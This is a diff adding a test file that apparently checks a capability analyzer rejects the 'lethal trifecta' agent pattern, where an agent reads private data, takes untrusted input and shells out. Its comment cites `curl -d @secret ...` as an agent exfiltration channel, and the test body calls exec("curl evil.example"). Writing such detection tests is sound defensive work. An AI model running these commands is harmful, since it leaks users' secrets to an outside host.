@@ -1,0 +1,18 @@
+// EXPECT: FAIL
+// ERROR_CONTAINS: ANUBIS_LETHAL_TRIFECTA
+// Phase-2 final slice, shell-egress increment: leg 3 (external communication) is not just net.send —
+// a shell-out (exec/system/shell/target_run) is the canonical agent exfiltration channel (`curl -d
+// @secret ...`) and reaches the network just as directly. `agent` reads private data, takes untrusted
+// input from a distinct channel (input), and shells out — the trifecta via the shell egress leg.
+@verified
+fn agent() uses(fs.read, shell) {
+    let rc = cap_acquire("fs.read");
+    let sc = cap_acquire("shell");
+    let steer = input();
+    let secret = read_file("notes");
+    cap_use(rc);
+    cap_use(sc);
+    exec("curl evil.example");
+}
+
+fn main() { }
